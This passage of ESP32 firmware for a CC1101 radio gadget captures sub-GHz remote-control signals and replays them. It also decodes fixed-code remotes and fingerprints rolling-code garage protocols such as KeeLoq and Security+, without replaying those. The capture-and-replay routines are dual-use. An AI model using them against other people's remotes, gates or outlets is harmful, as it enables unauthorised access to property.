void stop_rf_capture() {
#if CC1101_ACCESS_ENABLED
  if (!rf_capture_active) {
    return;
  }

  rf_capture_active = false;
  detachInterrupt(digitalPinToInterrupt(CC1101_GDO2));
  if (rf_rmt_ready) {
    rmtDeinit(CC1101_GDO0);
    rf_rmt_ready = false;
  }
  rf_rmt_capture_started = false;
  cc1101.packetMode();
#endif
}


bool rf_capture_edges_match(uint16_t first, uint16_t second) {
  uint32_t a = rf_capture_durations[first];
  uint32_t b = rf_capture_durations[second];
  if (a < RF_CAPTURE_MIN_PULSE_US || b < RF_CAPTURE_MIN_PULSE_US ||
      a >= RF_RMT_IDLE_MARKER_US || b >= RF_RMT_IDLE_MARKER_US ||
      rf_capture_levels[first] != rf_capture_levels[second]) {
    return false;
  }
  uint32_t difference = a > b ? a - b : b - a;
  uint32_t tolerance = max((uint32_t)100, (a + b) / 6U);
  return difference <= tolerance;
}


bool find_repeated_rf_frame(uint16_t &start_out, uint16_t &count_out) {
  // Find the shortest stable period inside the captured burst. Remotes often
  // send the same command a different number of times depending on how long
  // the button is held, so retaining the longest matching run makes otherwise
  // identical presses appear different. Keep exactly one repeated frame.
  const uint16_t captured_edges = rf_capture_edge_count;
  const uint16_t search_limit = captured_edges > 640 ? 640 : captured_edges;
  uint16_t best_start = 0;
  uint16_t best_period = 0;
  uint8_t best_repeats = 0;
  uint8_t best_quality = 0;

  for (uint16_t first = 0; first + 20 < search_limit; first++) {
    if (rf_capture_durations[first] >= RF_RMT_IDLE_MARKER_US) continue;
    uint16_t second_limit = min((uint16_t)(search_limit - 20),
                                (uint16_t)(first + RF_SAVED_RAW_MAX_EDGES));
    for (uint16_t second = first + 20; second <= second_limit; second++) {
      const uint16_t period = second - first;
      if (second + period > search_limit) continue;

      uint16_t matches = 0;
      for (uint16_t offset = 0; offset < period; offset++) {
        if (rf_capture_edges_match(first + offset, second + offset)) matches++;
      }
      uint8_t quality = (uint32_t)matches * 100U / period;
      if (quality < 85) continue;

      uint8_t repeats = 2;
      for (uint16_t next = second + period;
           next + period <= search_limit && repeats < 8;
           next += period) {
        uint16_t repeat_matches = 0;
        for (uint16_t offset = 0; offset < period; offset++) {
          if (rf_capture_edges_match(first + offset, next + offset)) repeat_matches++;
        }
        if ((uint32_t)repeat_matches * 100U / period < 85) break;
        repeats++;
      }

      if (repeats > best_repeats ||
          (repeats == best_repeats && quality > best_quality) ||
          (repeats == best_repeats && quality == best_quality &&
           (best_period == 0 || period < best_period))) {
        best_start = first;
        best_period = period;
        best_repeats = repeats;
        best_quality = quality;
      }
    }
  }

  if (best_period < 20) return false;
  start_out = best_start;
  count_out = best_period;
  rf_capture_repeat_quality = best_quality;
  rf_capture_repeat_count = best_repeats;
  Serial.printf("RF learner found one %u-edge frame repeated %u times (%u%% timing agreement)\n",
                best_period, best_repeats, best_quality);
  return true;
}


bool build_rf_learn_frame_from_capture(RfLearnFrame &frame) {
  if (rf_capture_edge_count < 20) return false;
  rf_capture_repeat_quality = 0;
  rf_capture_repeat_count = 0;

  // Prefer a frame that proves it repeats inside this one capture. This is a
  // lightweight BinRAW-style extraction: the eventual stored command is the
  // useful waveform, not the RMT stop marker or unrelated noise around it.
  uint16_t best_start = 0;
  uint16_t best_count = 0;
  bool repeated_frame = find_repeated_rf_frame(best_start, best_count);
  uint8_t idle_markers = 0;

  if (!repeated_frame) {
    // For short single-burst remotes, retain the best span between RMT's
    // artificial end-of-capture markers. Those still must agree over three
    // independent presses before a command can be saved.
    uint16_t span_start = 0;
    for (uint16_t i = 0; i <= rf_capture_edge_count; i++) {
      bool ends_span = i == rf_capture_edge_count ||
                       rf_capture_durations[i] >= RF_RMT_IDLE_MARKER_US;
      if (!ends_span) continue;

      uint16_t span_count = i - span_start;
      if (span_count >= 20 && span_count <= RF_SAVED_RAW_MAX_EDGES &&
          span_count > best_count) {
        best_start = span_start;
        best_count = span_count;
      }
      if (i < rf_capture_edge_count) {
        idle_markers++;
        span_start = i + 1;
      }
    }
  }
  if (best_count == 0) return false;

  // Normalize after the longest real pause. Captures can begin at different
  // instants, while a command's sync interval is a stable replay point.
  uint16_t anchor_offset = 0;
  uint32_t longest = 0;
  for (uint16_t i = 0; i < best_count; i++) {
    uint32_t duration = rf_capture_durations[best_start + i];
    if (duration > longest) {
      longest = duration;
      anchor_offset = i;
    }
  }
  if (longest < 800) return false;

  memset(&frame, 0, sizeof(frame));
  frame.edge_count = best_count;
  uint16_t start = (anchor_offset + 1) % best_count;
  frame.first_level = rf_capture_levels[best_start + start] ? 1 : 0;
  for (uint16_t i = 0; i < frame.edge_count; i++) {
    uint16_t source = best_start + ((start + i) % best_count);
    uint32_t duration = rf_capture_durations[source];
    if (duration < RF_CAPTURE_MIN_PULSE_US || duration >= RF_RMT_IDLE_MARKER_US) return false;
    frame.durations_us[i] = (uint16_t)duration;
  }
  if (repeated_frame) {
    Serial.printf("RF learner extracted %u-edge repeated waveform\n", frame.edge_count);
  } else if (idle_markers > 0 || rf_capture_edge_count != best_count) {
    Serial.printf("RF learner isolated %u-edge frame; ignored %u RMT idle marker(s)\n",
                  frame.edge_count, idle_markers);
  }
  return true;
}


bool rf_learn_frames_match(const RfLearnFrame &first, const RfLearnFrame &second) {
  if (first.edge_count != second.edge_count || first.edge_count < 20 ||
      first.first_level != second.first_level) {
    return false;
  }
  // Compare timing shape as well as absolute microseconds. Two captures from
  // the same inexpensive OOK remote can be uniformly a little faster/slower
  // because of oscillator and CC1101 data-slicer drift. Derive one scale
  // factor for the packet, then reject only edges that disagree with that
  // scaled timing. This remains deliberately stricter than a raw replay.
  uint32_t first_total = 0;
  uint32_t second_total = 0;
  for (uint16_t i = 0; i < first.edge_count; i++) {
    first_total += first.durations_us[i];
    second_total += second.durations_us[i];
  }
  if (first_total == 0 || second_total == 0) return false;
  const uint32_t scale_permille = second_total * 1000UL / first_total;
  if (scale_permille < 800 || scale_permille > 1250) return false;

  uint16_t matching_edges = 0;
  for (uint16_t i = 0; i < first.edge_count; i++) {
    uint32_t a = first.durations_us[i] * scale_permille / 1000UL;
    uint32_t b = second.durations_us[i];
    uint32_t difference = a > b ? a - b : b - a;
    // Data slicers naturally move edges by tens of microseconds. Compare the
    // timing class with a 25% window and permit a few noisy edges rather than
    // rejecting an otherwise identical packet on the first imperfect pulse.
    uint32_t tolerance = max((uint32_t)120, (a + b) / 8U);
    if (difference <= tolerance) matching_edges++;
  }
  return (uint32_t)matching_edges * 100U >= (uint32_t)first.edge_count * 90U;
}


uint8_t rf_learn_frame_similarity(const RfLearnFrame &first,
                                  const RfLearnFrame &second) {
  if (first.edge_count != second.edge_count || first.edge_count < 20 ||
      first.first_level != second.first_level) return 0;

  uint32_t first_total = 0;
  uint32_t second_total = 0;
  for (uint16_t i = 0; i < first.edge_count; i++) {
    first_total += first.durations_us[i];
    second_total += second.durations_us[i];
  }
  if (first_total == 0 || second_total == 0) return 0;
  const uint32_t scale_permille = second_total * 1000UL / first_total;
  if (scale_permille < 800 || scale_permille > 1250) return 0;

  uint16_t matching_edges = 0;
  for (uint16_t i = 0; i < first.edge_count; i++) {
    const uint32_t a = first.durations_us[i] * scale_permille / 1000UL;
    const uint32_t b = second.durations_us[i];
    const uint32_t difference = a > b ? a - b : b - a;
    const uint32_t tolerance = max((uint32_t)120, (a + b) / 8U);
    if (difference <= tolerance) matching_edges++;
  }
  return (uint8_t)((uint32_t)matching_edges * 100U / first.edge_count);
}


uint32_t rf_learn_frame_fingerprint(const RfLearnFrame &frame) {
  uint32_t hash = 2166136261UL;
  for (uint16_t i = 0; i < frame.edge_count; i++) {
    const uint16_t bucket = frame.durations_us[i] / 25U;
    hash ^= bucket;
    hash *= 16777619UL;
  }
  hash ^= frame.edge_count;
  return hash;
}


struct RfDynamicProtocolSignature {
  const char *name;
  uint16_t short_us;
  uint16_t long_us;
  uint16_t tolerance_us;
  uint16_t min_edges;
  uint16_t max_edges;
  float min_frequency_mhz;
  float max_frequency_mhz;
  bool ook;
};


uint32_t rf_duration_difference(uint32_t first, uint32_t second) {
  return first > second ? first - second : second - first;
}


uint8_t score_dynamic_protocol_signature(
  const RfDynamicProtocolSignature &signature,
  const RfLearnFrame first_set[RF_LEARN_SAMPLE_COUNT],
  const RfLearnFrame second_set[RF_LEARN_SAMPLE_COUNT]
) {
  uint32_t timing_samples = 0;
  uint32_t timing_match_quality = 0;
  uint32_t edge_total = 0;
  for (uint8_t set = 0; set < 2; set++) {
    const RfLearnFrame *frames = set == 0 ? first_set : second_set;
    for (uint8_t sample = 0; sample < RF_LEARN_SAMPLE_COUNT; sample++) {
      edge_total += frames[sample].edge_count;
      for (uint16_t edge = 0; edge < frames[sample].edge_count; edge++) {
        const uint16_t duration = frames[sample].durations_us[edge];
        // Ignore long synchronization gaps. The timing score describes the
        // encoded data cells, not the protocol's leading silence.
        if (duration > signature.long_us + signature.tolerance_us) continue;
        timing_samples++;
        const uint32_t short_difference =
          rf_duration_difference(duration, signature.short_us);
        const uint32_t long_difference =
          rf_duration_difference(duration, signature.long_us);
        const uint32_t closest_difference = min(short_difference, long_difference);
        if (closest_difference <= signature.tolerance_us) {
          timing_match_quality +=
            (signature.tolerance_us - closest_difference) * 100U /
            signature.tolerance_us;
        }
      }
    }
  }
  if (timing_samples < 40) return 0;

  const uint16_t average_edges = edge_total / (RF_LEARN_SAMPLE_COUNT * 2U);
  const uint8_t timing_score =
    (uint8_t)min((uint32_t)65,
                 timing_match_quality * 65U / (timing_samples * 100U));
  const uint8_t edge_score =
    average_edges >= signature.min_edges && average_edges <= signature.max_edges ? 15 : 0;
  const uint8_t active_profile_index = safe_rf_profile_index();
  const float frequency = RF_PROFILES[active_profile_index].frequency;
  const uint8_t frequency_score =
    frequency >= signature.min_frequency_mhz && frequency <= signature.max_frequency_mhz ? 10 : 0;
  const uint8_t modulation_score =
    RF_PROFILES[active_profile_index].ook == signature.ook ? 10 : 0;
  return timing_score + edge_score + frequency_score + modulation_score;
}


void identify_dynamic_protocol(
  const RfLearnFrame first_set[RF_LEARN_SAMPLE_COUNT],
  const RfLearnFrame second_set[RF_LEARN_SAMPLE_COUNT],
  char *name_out,
  size_t name_size,
  uint8_t *confidence_out
) {
  // Receive-only signatures derived from public protocol timing and frame
  // descriptions. They identify a likely family; they do not decrypt,
  // generate, synchronize, or replay a rolling-code transmission.
  static const RfDynamicProtocolSignature signatures[] = {
    {"KEELOQ HCS200/300", 370, 772, 180, 120, 165, 280.0f, 930.0f, true},
    {"SECURITY+ 1.0", 500, 1500, 180, 38, 105, 300.0f, 400.0f, true},
    {"SECURITY+ 2.0", 250, 500, 110, 60, 155, 300.0f, 400.0f, true},
    {"NICE FLOR-S / ONE", 500, 1000, 300, 70, 165, 400.0f, 900.0f, true},
    {"SOMFY TELIS / RTS", 640, 1280, 250, 60, 165, 433.0f, 434.0f, true},
    {"CAME ATOMO", 600, 1200, 250, 65, 155, 433.0f, 434.0f, true},
    {"CAME ATOMO", 600, 1200, 250, 65, 155, 868.0f, 869.0f, true}
  };

  uint8_t best_score = 0;
  const char *best_name = "UNKNOWN CHANGING CODE";
  for (uint8_t i = 0; i < sizeof(signatures) / sizeof(signatures[0]); i++) {
    const uint8_t score = score_dynamic_protocol_signature(
      signatures[i], first_set, second_set);
    if (score > best_score) {
      best_score = score;
      best_name = signatures[i].name;
    }
  }
  if (best_score < 78) best_name = "UNKNOWN CHANGING CODE";
  strlcpy(name_out, best_name, name_size);
  if (confidence_out != NULL) *confidence_out = best_score;
}


bool analyze_changing_code_candidate(const RfLearnFrame frames[RF_LEARN_SAMPLE_COUNT],
                                     uint8_t *similarity_out) {
  const uint8_t similarity_01 = rf_learn_frame_similarity(frames[0], frames[1]);
  const uint8_t similarity_02 = rf_learn_frame_similarity(frames[0], frames[2]);
  const uint8_t similarity_12 = rf_learn_frame_similarity(frames[1], frames[2]);
  const uint8_t average = (similarity_01 + similarity_02 + similarity_12) / 3U;
  if (similarity_out != NULL) *similarity_out = average;

  // This is intentionally a candidate detector, not a protocol decoder. A
  // stable frame shape with three different payload fingerprints is typical
  // of rolling/changing-code traffic, while very low similarity is noise or
  // three unrelated signals. Replay and saving remain disabled.
  const bool same_shape = frames[0].edge_count == frames[1].edge_count &&
                          frames[0].edge_count == frames[2].edge_count &&
                          frames[0].first_level == frames[1].first_level &&
                          frames[0].first_level == frames[2].first_level;
  const uint32_t fingerprint_0 = rf_learn_frame_fingerprint(frames[0]);
  const uint32_t fingerprint_1 = rf_learn_frame_fingerprint(frames[1]);
  const uint32_t fingerprint_2 = rf_learn_frame_fingerprint(frames[2]);
  const bool all_different = fingerprint_0 != fingerprint_1 &&
                             fingerprint_0 != fingerprint_2 &&
                             fingerprint_1 != fingerprint_2;
  const bool every_pair_has_stable_structure = similarity_01 >= 55 &&
                                                similarity_02 >= 55 &&
                                                similarity_12 >= 55;
  return same_shape && all_different && every_pair_has_stable_structure &&
         average >= 60 && average < 90;
}


bool store_changing_code_analysis(
  const RfLearnFrame frames[RF_LEARN_SAMPLE_COUNT],
  uint8_t structural_similarity,
  const char *likely_protocol,
  uint8_t protocol_confidence
) {
  RollingCodeAnalysisRecord record = {};
  record.magic = ROLLING_ANALYSIS_MAGIC;
  const uint8_t active_profile_index = safe_rf_profile_index();
  record.frequency_mhz = RF_PROFILES[active_profile_index].frequency;
  record.profile_index = active_profile_index;
  record.structural_similarity = structural_similarity;
  record.edge_count = frames[0].edge_count;
  record.protocol_confidence = protocol_confidence;
  strlcpy(record.likely_protocol, likely_protocol, sizeof(record.likely_protocol));
  strlcpy(record.category,
          rf_smart_learn_category != NULL ? rf_smart_learn_category : "UNKNOWN",
          sizeof(record.category));

  for (uint8_t sample = 0; sample < RF_LEARN_SAMPLE_COUNT; sample++) {
    record.fingerprints[sample] = rf_learn_frame_fingerprint(frames[sample]);
    uint32_t total = 0;
    uint16_t shortest = UINT16_MAX;
    uint16_t longest = 0;
    for (uint16_t edge = 0; edge < frames[sample].edge_count; edge++) {
      const uint16_t duration = frames[sample].durations_us[edge];
      total += duration;
      if (duration < shortest) shortest = duration;
      if (duration > longest) longest = duration;
    }
    record.total_us[sample] = total;
    record.shortest_us[sample] = shortest == UINT16_MAX ? 0 : shortest;
    record.longest_us[sample] = longest;
  }

  if (rtc_ready && rtc.isClockIntegrityGuaranteed()) {
    RTC_DateTime now = rtc.getDateTime();
    format_clock_text(record.date_time, sizeof(record.date_time), now, true);
  } else {
    strlcpy(record.date_time, "DATE NOT SET", sizeof(record.date_time));
  }

  saved_preferences.begin("ripperzero", false);
  record.sequence = saved_preferences.getUInt("rollSeq", 0) + 1;
  saved_preferences.putUInt("rollSeq", record.sequence);
  const uint8_t slot = (record.sequence - 1) % MAX_ROLLING_ANALYSIS_RECORDS;
  char key[12];
  snprintf(key, sizeof(key), "roll%u", slot);
  const bool internal_saved =
    saved_preferences.putBytes(key, &record, sizeof(record)) == sizeof(record);
  saved_preferences.end();

  if (sd_card_ready) {
    File file = SD_MMC.open("/rolling_analysis_v2.csv", FILE_APPEND);
    if (file) {
      if (file.size() == 0) {
        file.println("sequence,date,category,frequency_mhz,radio_profile,likely_protocol,protocol_confidence,edges,structural_similarity,fingerprint_1,fingerprint_2,fingerprint_3,total_1_us,total_2_us,total_3_us");
      }
      file.printf("%lu,%s,%s,%.3f,%s,%s,%u,%u,%u,%08lX,%08lX,%08lX,%lu,%lu,%lu\n",
                  (unsigned long)record.sequence, record.date_time,
                  record.category, record.frequency_mhz,
                  RF_PROFILES[record.profile_index].name,
                  record.likely_protocol, record.protocol_confidence,
                  record.edge_count, record.structural_similarity,
                  (unsigned long)record.fingerprints[0],
                  (unsigned long)record.fingerprints[1],
                  (unsigned long)record.fingerprints[2],
                  (unsigned long)record.total_us[0],
                  (unsigned long)record.total_us[1],
                  (unsigned long)record.total_us[2]);
      file.close();
    }
  }

  Serial.printf("Stored changing-code analysis #%lu in slot %u: %s (%u%%)%s\n",
                (unsigned long)record.sequence, slot, record.likely_protocol,
                record.protocol_confidence,
                sd_card_ready ? " and SD CSV" : "");
  return internal_saved;
}


uint16_t rf_median_duration(uint16_t a, uint16_t b, uint16_t c) {
  if (a > b) { uint16_t swap = a; a = b; b = swap; }
  if (b > c) { uint16_t swap = b; b = c; c = swap; }
  if (a > b) b = a;
  return b;
}


const char *rf_capture_quality_name(float peak_rssi, float baseline_rssi) {
  const float rise = peak_rssi - baseline_rssi;
  if (peak_rssi >= -55.0f && rise >= 18.0f && rf_capture_repeat_quality >= 92) return "EXCELLENT";
  if (peak_rssi >= -70.0f && rise >= 12.0f && rf_capture_repeat_quality >= 85) return "GOOD";
  if (peak_rssi >= RF_CAPTURE_MIN_VALID_RSSI_DBM && rise >= RF_CAPTURE_MIN_RSSI_RISE_DB) return "FAIR";
  return "WEAK";
}


bool replay_saved_rf_raw_command(const SavedRfRawCommand &command) {
#if !CC1101_ACCESS_ENABLED
  (void)command;
  return false;
#else
  if (!cc1101_ready || !command.valid || command.edge_count < 20 ||
      command.edge_count > RF_SAVED_RAW_MAX_EDGES ||
      command.profile_index >= RF_PROFILE_COUNT) {
    return false;
  }
  if (!apply_rf_profile(command.profile_index, false)) return false;

  pinMode(CC1101_GDO0, OUTPUT);
  digitalWrite(CC1101_GDO0, LOW);
  if (cc1101.transmitDirectAsync() != RADIOLIB_ERR_NONE) {
    pinMode(CC1101_GDO0, INPUT);
    return false;
  }

  // valid=1 is the legacy raw-burst format. valid=2 marks the new canonical
  // one-frame format, which must be repeated like the original outlet remote.
  const uint8_t repeat_count = command.valid >= 2 ? 8 : 1;
  for (uint8_t repeat = 0; repeat < repeat_count; repeat++) {
    bool level = command.first_level != 0;
    digitalWrite(CC1101_GDO0, level ? HIGH : LOW);
    for (uint16_t i = 0; i < command.edge_count; i++) {
      delayMicroseconds(command.durations_us[i]);
      level = !level;
      digitalWrite(CC1101_GDO0, level ? HIGH : LOW);
    }
  }

  digitalWrite(CC1101_GDO0, LOW);
  cc1101.packetMode();
  pinMode(CC1101_GDO0, INPUT);
  return true;
#endif
}


void send_saved_rf_button(lv_event_t *e) {
  uint8_t button_index = (uint8_t)(uintptr_t)lv_event_get_user_data(e);
  if (selected_saved_index < 0 || selected_saved_index >= saved_remote_count ||
      button_index >= MAX_UNIVERSAL_BUTTONS) return;
  const SavedRfRawCommand &command = saved_rf_raw_commands[selected_saved_index][button_index];
  if (!command.valid) {
    set_status("RF BUTTON HAS NO SIGNAL", COLOR_RED);
    return;
  }
  set_status("TRANSMITTING", COLOR_RF);
  if (replay_saved_rf_raw_command(command)) {
    Serial.printf("RF remote sent: %s\n", saved_remotes[selected_saved_index].button_names[button_index]);
    set_status("SYSTEM READY", COLOR_READY);
  } else {
    set_status("RF SEND FAILED", COLOR_RED);
  }
}


bool replay_rf_capture_once() {
#if !CC1101_ACCESS_ENABLED
  return false;
#else
  if (!cc1101_ready || !rf_capture_ready || rf_capture_edge_count < 20) {
    return false;
  }

  pinMode(CC1101_GDO0, OUTPUT);
  digitalWrite(CC1101_GDO0, LOW);
  int16_t state = cc1101.transmitDirectAsync();
  if (state != RADIOLIB_ERR_NONE) {
    pinMode(CC1101_GDO0, INPUT);
    Serial.printf("CC1101 raw replay start failed: %d\n", state);
    return false;
  }

  // Replay a single captured waveform. This is intentionally one-shot and is
  // only for checking the user's own fan before implementing saved replay.
  bool level = false;
  // Recreate the quiet lead-in that separates repeated outlet commands.
  delayMicroseconds(15000);
  uint16_t edges = rf_capture_edge_count;
  for (uint16_t i = 0; i < edges; i++) {
    uint32_t duration = rf_capture_durations[i];
    if (duration < 100 || duration > 20000) {
      continue;
    }
    level = !level;
    digitalWrite(CC1101_GDO0, level ? HIGH : LOW);
    delayMicroseconds(duration);
  }

  digitalWrite(CC1101_GDO0, LOW);
  cc1101.packetMode();
  pinMode(CC1101_GDO0, INPUT);
  Serial.printf("CC1101 replayed %u raw pulse edges\n", edges);
  return true;
#endif
}


void print_hunter_capture_dump(uint16_t edges) {
  const uint16_t dump_edges = edges < 256 ? edges : 256;
  Serial.printf("RF_RAW_US count=%u\n", dump_edges);
  for (uint16_t i = 0; i < dump_edges; i++) {
    Serial.print((unsigned long)rf_capture_durations[i]);
    Serial.print((i + 1) % 16 == 0 ? '\n' : ',');
  }
  if (dump_edges % 16 != 0) Serial.println();
}

void print_hunter_capture_levels(uint16_t edges) {
  const uint16_t dump_edges = edges < 256 ? edges : 256;
  Serial.print("RF_LEVELS=");
  for (uint16_t i = 0; i < dump_edges; i++) Serial.print(rf_capture_levels[i] ? '1' : '0');
  Serial.println();
}

void print_hunter_normalized_bits(uint16_t edges) {
  Serial.print("RF_NORMALIZED=");
  for (uint16_t i = 0; i < edges; i++) {
    uint32_t d = rf_capture_durations[i];
    if (d >= 300 && d <= 900) Serial.print(d < 600 ? '0' : '1');
  }
  Serial.println();
}

void print_hunter_stable_tail(uint16_t edges) {
  char bits[513];
  uint16_t count = 0;
  for (uint16_t i = 0; i < edges && count < sizeof(bits) - 1; i++) {
    uint32_t d = rf_capture_durations[i];
    if (d >= 300 && d <= 900) bits[count++] = d < 600 ? '0' : '1';
  }
  bits[count] = '\0';
  const uint16_t tail = count > 120 ? 120 : count;
  Serial.print("RF_STABLE_TAIL=");
  Serial.println(bits + count - tail);
}

uint32_t rf_frame_fingerprint(uint16_t start, uint16_t end) {
  uint32_t hash = 2166136261UL;
  for (uint16_t i = start; i < end; i++) {
    // A 25 us bucket tolerates small timer/data-slicer variation while still
    // distinguishing a genuinely different fixed-code frame.
    uint16_t bucket = (uint16_t)(rf_capture_durations[i] / 25U);
    hash ^= bucket;
    hash *= 16777619UL;
  }
  return hash;
}

void print_rf_frame_candidates(uint16_t edges) {
  uint16_t start = 0;
  uint8_t frame_number = 0;
  for (uint16_t i = 0; i < edges; i++) {
    if (rf_capture_durations[i] < RF_FRAME_DELIMITER_US) continue;
    // The first segment starts at an arbitrary time, so only report segments
    // that begin after a full inter-frame delimiter.
    if (frame_number > 0 || start > 0) {
      uint16_t length = i - start;
      if (length >= 6) {
        Serial.printf("RF_FRAME %u edges=%u fingerprint=%08lX\n", frame_number,
                      length, (unsigned long)rf_frame_fingerprint(start, i));
      }
    }
    frame_number++;
    start = i + 1;
  }
  if (start > 0 && edges - start >= 6) {
    Serial.printf("RF_FRAME %u edges=%u fingerprint=%08lX\n", frame_number,
                  edges - start, (unsigned long)rf_frame_fingerprint(start, edges));
  }
}

// Look for the common fixed-code pulse-pair family used by many inexpensive
// outlet/switch remotes (short/long and long/short pairs).  This is deliberately
// only a detector: a code must repeat across separate captures before it can
// become a saved command.
void detect_fixed_code_pulse_pairs(uint16_t edges) {
  for (uint16_t start = 0; start + 48 <= edges; start++) {
    uint32_t code = 0;
    uint8_t bits = 0;
    uint16_t short_sum = 0;
    uint8_t short_count = 0;
    bool valid = true;

    for (uint8_t bit = 0; bit < 24; bit++) {
      uint16_t i = start + bit * 2;
      uint32_t first = rf_capture_durations[i];
      uint32_t second = rf_capture_durations[i + 1];
      if (first < 100 || second < 100 || first > 5000 || second > 5000 ||
          rf_capture_levels[i] == rf_capture_levels[i + 1]) {
        valid = false;
        break;
      }
      uint32_t shorter = first < second ? first : second;
      uint32_t longer = first < second ? second : first;
      // A broad 2:1 to 5:1 acceptance range handles common protocol variants
      // and timer error, while excluding nearly equal noise pulses.
      if (longer < shorter * 2 || longer > shorter * 5) {
        valid = false;
        break;
      }
      if (shorter > 900) {
        valid = false;
        break;
      }
      short_sum += shorter;
      short_count++;
      code = (code << 1) | (first > second ? 1UL : 0UL);
      bits++;
    }

    if (valid && bits == 24 && short_count == 24) {
      uint16_t pulse = short_sum / short_count;
      Serial.printf("RF FIXED-CODE CANDIDATE: EV1527/HS1527-like, bits=24 code=%06lX pulse=%u us\n",
                    (unsigned long)code, pulse);
      return;
    }
  }
  Serial.println("RF fixed-code decoder: no supported pulse-pair frame");
}

// First stage of the generic fixed-code learner.  Many inexpensive 315/433 MHz
// switches encode a command as integer multiples of one short OOK pulse.  This
// does not assume a vendor or command format; it only decides whether the
// captured waveform looks clean enough to offer a fixed-code decoder next.
void analyze_generic_ook_candidate(uint16_t edges) {
  const uint16_t BIN_US = 25;
  const uint16_t MIN_BASE_US = 175;
  const uint16_t MAX_BASE_US = 700;
  const uint8_t BIN_COUNT = (MAX_BASE_US - MIN_BASE_US) / BIN_US + 1;
  uint16_t bins[BIN_COUNT] = {0};

  for (uint16_t i = 0; i < edges; i++) {
    uint32_t duration = rf_capture_durations[i];
    if (duration >= MIN_BASE_US && duration <= MAX_BASE_US) {
      bins[(duration - MIN_BASE_US) / BIN_US]++;
    }
  }

  uint8_t best_bin = 0;
  for (uint8_t i = 1; i < BIN_COUNT; i++) {
    if (bins[i] > bins[best_bin]) best_bin = i;
  }
  uint16_t base = MIN_BASE_US + best_bin * BIN_US + BIN_US / 2;
  uint16_t valid = 0;
  uint16_t pulse_multiple_matches = 0;
  for (uint16_t i = 0; i < edges; i++) {
    uint32_t duration = rf_capture_durations[i];
    if (duration < 120 || duration > 10000) continue;
    valid++;
    uint8_t multiple = (duration + base / 2) / base;
    if (multiple >= 1 && multiple <= 16) {
      uint32_t expected = (uint32_t)multiple * base;
      uint32_t error = duration > expected ? duration - expected : expected - duration;
      if (error <= base / 4) pulse_multiple_matches++;
    }
  }

  uint8_t confidence = valid ? (uint32_t)pulse_multiple_matches * 100 / valid : 0;
  if (bins[best_bin] >= 8 && confidence >= 65) {
    Serial.printf("RF PROFILE CANDIDATE: OOK fixed-code pulse=%u us confidence=%u%%\n", base, confidence);
    Serial.println("Possible PT2262/SC2262/HT6P20B tri-state family; capture 3 matching presses before saving");
  } else {
    Serial.printf("RF PROFILE: unclassified (OOK pulse-fit confidence=%u%%)\n", confidence);
    Serial.println("Keep as raw/advanced profile; do not save or replay yet");
  }
}


// ============================================================
// DISPLAY FLUSH
// ============================================================

void my_disp_flush(
  lv_disp_drv_t *disp_drv,
  const lv_area_t *area,
  lv_color_t *color_p
) {

  uint32_t w =
    area->x2 - area->x1 + 1;

  uint32_t h =
    area->y2 - area->y1 + 1;


  gfx->draw16bitRGBBitmap(
    area->x1,
    area->y1,
    (uint16_t *)&color_p->full,
    w,
    h
  );


  lv_disp_flush_ready(
    disp_drv
  );
}


// ============================================================
// TOUCH READ
// ============================================================

void my_touchpad_read(
  lv_indev_drv_t *indev_drv,
  lv_indev_data_t *data
) {

  int16_t x[1];
  int16_t y[1];

  uint8_t touched =
    touch.getPoint(
      x,
      y,
      1
    );


  if (touched) {

    auto_shutdown_last_activity_ms = millis();

    data->state =
      LV_INDEV_STATE_PR;

    data->point.x =
      x[0];

    data->point.y =
      y[0];

  } else {

    data->state =
      LV_INDEV_STATE_REL;
  }
}


// ============================================================
// LCD RESET
// ============================================================

void lcd_reset() {

  TCA.write1(
    1,
    1
  );

  delay(10);


  TCA.write1(
    1,
    0
  );

  delay(10);


  TCA.write1(
    1,
    1
  );

  delay(200);
}


// ============================================================
// STATUS FUNCTIONS
// ============================================================

void set_status(
  const char *text,
  uint32_t color
) {

  // The header is an activity indicator, not a screen title or notification
  // area.  It stays green and ready while navigating; only live RF/IR work
  // changes it to LISTENING or TRANSMITTING.  Errors/results are shown in
  // their screen-specific labels and Serial Monitor instead.
  // RF Scanner states are live, user-visible work just like LISTENING. Keep
  // them in the shared header instead of collapsing them to SYSTEM READY.
  bool rf_scanner_operation = strcmp(text, "SCANNING") == 0 ||
                              strcmp(text, "REFINING") == 0 ||
                              strcmp(text, "LOCKED") == 0 ||
                              strcmp(text, "CAPTURING") == 0 ||
                              strcmp(text, "COMPLETE") == 0 ||
                              strcmp(text, "NO SIGNAL") == 0;
  bool active_operation = strcmp(text, "LISTENING") == 0 ||
                          strcmp(text, "TRANSMITTING") == 0 ||
                          strcmp(text, "CONNECTING") == 0 ||
                          strcmp(text, "RECORDING") == 0 ||
                          strcmp(text, "SERVING") == 0 ||
                          strcmp(text, "DIAGNOSTICS") == 0 ||
                          strcmp(text, "CONNECTED") == 0 ||
                          rf_scanner_operation;
  bool transmitting = strcmp(text, "TRANSMITTING") == 0;
  if (transmitting) transmitting_status_until_ms = millis() + 700;
  bool keep_transmitting = !active_operation && transmitting_status_until_ms != 0 &&
                           (int32_t)(millis() - transmitting_status_until_ms) < 0;
  const char *display_text = transmitting || keep_transmitting ? "TRANSMITTING" :
                             (active_operation ? text : "SYSTEM READY");
  uint32_t display_color = transmitting || keep_transmitting ? COLOR_SETTINGS :
                           (active_operation ? color : COLOR_READY);

  for (uint8_t i = 0; i < status_indicator_count; i++) {
    lv_label_set_text(
      status_labels[i],
      display_text
    );

    lv_obj_set_style_text_color(
      status_labels[i],
      lv_color_hex(display_color),
      LV_PART_MAIN
    );
    lv_obj_set_style_bg_color(
      status_dots[i],
      lv_color_hex(display_color),
      LV_PART_MAIN
    );
  }
}


// ============================================================
// SCREEN NAVIGATION
// ============================================================

void go_home(
  lv_event_t *e
) {

  lv_scr_load(
    home_screen
  );

  set_status(
    "SYSTEM READY",
    COLOR_READY
  );
}


void open_rf(
  lv_event_t *e
) {
#if RIPPER_SAFE_HOME_RECOVERY
  (void)e;
  Serial.println("SAFE RECOVERY: RF screen held");
  return;
#endif

  lv_scr_load(
    rf_screen
  );

  set_status(
    "RF READY",
    COLOR_RF
  );
}


void open_ir(
  lv_event_t *e
) {
#if RIPPER_SAFE_HOME_RECOVERY
  (void)e;
  Serial.println("SAFE RECOVERY: IR screen held");
  return;
#endif

  lv_scr_load(
    ir_screen
  );

  set_status(
    "IR READY",
    COLOR_IR
  );
}


void open_bluetooth(lv_event_t *e) {
  bluetooth_opened_from_ble = false;
  lv_scr_load(bluetooth_screen);
  refresh_bluetooth_screen();
  set_status("SYSTEM READY", COLOR_READY);
}


